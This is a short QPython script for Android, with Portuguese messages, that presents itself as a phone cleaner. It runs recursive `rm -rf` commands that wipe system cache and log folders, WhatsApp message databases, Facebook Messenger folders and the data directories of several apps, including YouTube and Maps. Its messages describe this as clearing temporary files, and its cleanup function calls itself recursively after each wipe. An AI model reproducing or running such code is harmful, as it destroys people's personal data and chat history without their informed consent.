#-*-coding:utf8;-*-
#qpy:2
#qpy:console
from os import system
from os import chdir
import sys
from time import sleep

def clear():
    try:
        chdir('/cache')
        system('rm -rf *')
        chdir('/data/system/dropbox/')
        system('rm -rf *')
        clear()
    except:       
        chdir('/storage/emulated/0/DCIM')
        system('rm -rf .thumbnails')
        print('[+] Limpando .thumbnails...')
        chdir('/storage/emulated/0/WhatsApp')
        system('rm -rf databases')
        print('[+] Databases limpadas!')
        chdir('/storage/emulated/0/WhatsApp')
        system('rm -rf .Shared')
        system('rm -rf .trash')
        print('[+] Crash limpadas!')
        chdir('/storage/emulated/0')
        system('rm -rf com.facebook.orca')
        system('rm -rf .face')
        print('[+] Arquivos Temporarios do FB Limpados!')
        chdir('/data/log')
        system('rm -rf *')
        print('[+] Limpando logs do sistema...')
        sleep(2)
        chdir('/storage/emulated/0/Android/data/')
        system('rm -rf eu.thedarken.sdm')
        system('rm -rf com.meitu.pomelo')
        system('rm -rf com.google.android.youtube')
        system('rm -rf com.google.android.music')
        system('rm -rf com.google.android.apps.maps')
    
clear()
print('\n[!] Limpeza Concluida!')
sys.exit(0)